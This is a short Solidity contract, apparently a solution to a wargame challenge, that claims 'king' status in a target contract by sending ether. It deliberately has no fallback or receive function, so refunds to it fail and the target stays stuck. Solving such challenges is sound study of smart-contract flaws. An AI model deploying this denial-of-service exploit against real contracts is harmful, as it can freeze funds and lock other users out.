// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.8.0;

 
contract Solution {

    function becomeKing(address payable _instance) public payable {
       (bool sent, ) = _instance.call{value: msg.value, gas: 4000000 }("");
        require(sent, "Failed to send Ether");
    }
    
    //No fallback or receive functions to receive ether into this contract
}

